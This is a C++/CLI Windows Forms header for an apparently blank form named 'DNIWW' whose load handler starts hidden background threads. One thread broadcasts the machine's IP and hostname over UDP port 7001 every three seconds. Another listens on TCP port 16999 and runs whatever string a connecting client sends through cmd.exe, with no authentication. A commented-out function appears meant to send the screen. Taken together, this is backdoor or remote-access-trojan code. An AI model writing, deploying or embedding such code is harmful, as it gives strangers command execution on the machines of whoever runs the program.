#pragma once
#include<stdio.h>
#include<WinSock2.h>
#include <iphlpapi.h>


#pragma comment (lib,"ws2_32")
#pragma comment(lib, "IPHLPAPI.lib")
namespace DNIW {
	const int MAX_BUF_LEN = 255;

	using namespace std;
	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace Threading;



	/// <summary>
	/// DNIWW 的摘要
	/// </summary>
	public ref class DNIWForm : public System::Windows::Forms::Form
	{
	public:
		DNIWForm(void)
		{
			InitializeComponent();
			//
			//TODO:  在此加入建構函式程式碼
			//
		}

	protected:
		/// <summary>
		/// 清除任何使用中的資源。
		/// </summary>
		~DNIWForm()
		{
			if (components)
			{
				delete components;
			}
		}

	private:
		/// <summary>
		/// 設計工具所需的變數。
		/// </summary>
		System::ComponentModel::Container^ components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// 此為設計工具支援所需的方法 - 請勿使用程式碼編輯器修改
		/// 這個方法的內容。
		/// </summary>
		void InitializeComponent(void)
		{
			this->SuspendLayout();
			// 
			// DNIWW
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 12);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(284, 262);
			this->Name = L"DNIWW";
			this->Text = L"DNIWW";
			this->Load += gcnew System::EventHandler(this, &DNIWForm::DNIWForm_Load);
			this->ResumeLayout(false);

		}
		
		void broadcastIP() {
			WORD wVersionRequested;
				WSADATA wasData;
				int err;
				struct hostent* ph = 0;
				wVersionRequested = MAKEWORD(2, 2);
		
				err = WSAStartup(wVersionRequested, &wasData);
				if (err != 0)
				{
					this->Close();
				}
				if (LOBYTE(wasData.wVersion) != 2 || HIBYTE(wasData.wVersion) != 2)
				{
					WSACleanup();
					this->Close();
				}
				SOCKET conn_sock = socket(AF_INET, SOCK_DGRAM, 0);
				if (conn_sock == INVALID_SOCKET)
				{

					closesocket(conn_sock);
					WSACleanup();
					this->Close();
				}
				bool bOpt = true;
		
				setsockopt(conn_sock, SOL_SOCKET, SO_BROADCAST, (char*)& bOpt, sizeof(bOpt));
		
				SOCKADDR_IN saUdpServ;
				memset(&saUdpServ, 0, sizeof(saUdpServ));
				saUdpServ.sin_family = AF_INET;
				saUdpServ.sin_addr.S_un.S_addr = htonl(INADDR_BROADCAST);
				saUdpServ.sin_port = htons(7001);
				int nSize = sizeof(SOCKADDR_IN);

				char buff[MAX_BUF_LEN];
				memset(buff, 0, MAX_BUF_LEN);
	

		
				char szHost[256] = "";
				char szIp[256] = "";
				::gethostname(szHost, 256);
				hostent* pHost = ::gethostbyname(szHost);
				char* p = pHost->h_addr_list[1];
				in_addr addr;
				char* szIpTemp = NULL;
				for (int i = 0;; i++)
				{
					char* p = pHost->h_addr_list[i];
					if (p == NULL)
					{
						break;
					}
					memcpy(&addr.S_un.S_addr, p, pHost->h_length);
					szIpTemp = ::inet_ntoa(addr);
				}

				char* ip = NULL;

				while (1) {
			
					sprintf(buff,"IP : %s \r\nHOSTNAME : %s \r\n", szIpTemp, ::gethostbyname(szHost));

					int nSendSize = sendto(conn_sock, buff, strlen(buff), 0, (SOCKADDR*)& saUdpServ, nSize);
					if (nSendSize == SOCKET_ERROR)
					{
						closesocket(conn_sock);
						WSACleanup();
						this->Close();
					}

					Sleep(3000);
				}

				closesocket(conn_sock);
				WSACleanup();
		}

		void recvCMD() {
			WSADATA TCPwsaData;
			WSAStartup(MAKEWORD(2,2),&TCPwsaData);

			in_addr addr;
			char* szIpTemp = ::inet_ntoa(addr);

			char szMsg[MAXBYTE] = {0};
			SOCKET sListent = socket(PF_INET,SOCK_STREAM, IPPROTO_TCP);
			sockaddr_in ServerAddr;
			ServerAddr.sin_family = AF_INET;
			//ServerAddr.sin_addr.S_un.S_addr = inet_addr(szIpTemp);
			ServerAddr.sin_addr.S_un.S_addr = ADDR_ANY;
			ServerAddr.sin_port = htons(16999);

			bind(sListent,(SOCKADDR *)&ServerAddr,sizeof(ServerAddr));
			listen(sListent,1);
			
			sockaddr_in ClientAddr;
			int nSize = sizeof(ClientAddr);
			SOCKET sClient = accept(sListent, (SOCKADDR*)& ClientAddr, &nSize);
		
			BOOL ok = true;
			HANDLE InPipeRead = NULL;
			HANDLE InPipeWrite = NULL;
			HANDLE OutPipeRead = NULL;
			HANDLE OutPipeWrite = NULL;

			SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
			ok = CreatePipe(&InPipeRead,&InPipeWrite,&sa,0);
			if (ok==FALSE){this->Close();}
			ok = CreatePipe(&OutPipeRead, &OutPipeWrite, &sa, 0);
			if (ok == FALSE) { this->Close(); }

			recv(sClient,szMsg,MAXBYTE,0);

			STARTUPINFO si = {};
			si.cb = sizeof(STARTUPINFO);
			si.dwFlags = STARTF_USESTDHANDLES;
			si.hStdError = OutPipeWrite;
			si.hStdOutput = OutPipeWrite;
			si.hStdInput = InPipeRead;
			PROCESS_INFORMATION pi = {};

			wchar_t  ws[1024];
			swprintf(ws, 1024, L"C:\\Windows\\System32\\cmd.exe /k %hs", szMsg);

			LPCWSTR lpApplicationName = L"C:\\Windows\\System32\\cmd.exe";
			LPWSTR lpCommandLine = (LPWSTR)ws;

			/*char* lpCommandLine = "C:\\Windows\\System32\\cmd.exe /k ";
			strcat(lpCommandLine,szMsg);*/
			
			LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
			LPSECURITY_ATTRIBUTES lpThreadAttribute = NULL;
			BOOL bInheritHandles = TRUE;
			DWORD dwCreationFlags = 0;
			LPVOID lpEnvironment = NULL;
			LPCWSTR lpCurrentDirectory = NULL;
			ok = CreateProcess(
				lpApplicationName,
				(LPWSTR)lpCommandLine,
				lpProcessAttributes,
				lpThreadAttribute,
				bInheritHandles,
				dwCreationFlags,
				lpEnvironment,
				lpCurrentDirectory,
				&si,
				&pi);
			if (ok == FALSE) { this->Close(); }

			CloseHandle(OutPipeWrite);
			CloseHandle(InPipeRead);

			char buf[1024 + 1] = { };
			DWORD dwRead = 0;
			DWORD dwAvail = 0;
			ok = ReadFile(OutPipeRead, buf, 1024, &dwRead, NULL);
			while (ok == TRUE)
			{
				buf[dwRead] = '\0';
				OutputDebugStringA(buf);
				puts(buf);
				ok = ReadFile(OutPipeRead, buf, 1024, &dwRead, NULL);
			}

			// Clean up and exit.
			CloseHandle(OutPipeRead);
			CloseHandle(InPipeWrite);
			DWORD dwExitCode = 0;
			GetExitCodeProcess(pi.hProcess, &dwExitCode);

			closesocket(sListent);
			WSACleanup();
		}
		void sendPic() {
			/*WSADATA TCPwsaData;
			WSAStartup(MAKEWORD(2, 2), &TCPwsaData);

			HWND hwnd;
			HDC hdc = GetDC(hwnd);

			
			in_addr addr;
			char* szIpTemp = ::inet_ntoa(addr);

			char szMsg[MAXBYTE] = { 0 };
			SOCKET sListent = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
			sockaddr_in ServerAddr;
			ServerAddr.sin_family = AF_INET;
			ServerAddr.sin_addr.S_un.S_addr = ADDR_ANY;
			ServerAddr.sin_port = htons(16999);

			bind(sListent, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr));
			listen(sListent, 1);

			sockaddr_in ClientAddr;
			int nSize = sizeof(ClientAddr);
			SOCKET sClient = accept(sListent, (SOCKADDR*)& ClientAddr, &nSize);

			send(sClient, szMsg, MAXBYTE, 0);

			ReleaseDC(hwnd, hdc);
			closesocket(sListent);
			WSACleanup();*/
		}
		
#pragma endregion
	private: System::Void DNIWForm_Load(System::Object^ sender, System::EventArgs^ e) {
		::System::Threading::Thread^ thr1 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWForm::broadcastIP));
		thr1->Start();
		::System::Threading::Thread^ thr2 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWForm::recvCMD));
		thr2->Start();
		::System::Threading::Thread^ thr3 = gcnew ::System::Threading::Thread(gcnew ::System::Threading::ThreadStart(this, &DNIWForm::sendPic));
		thr3->Start();
	}
	};
}










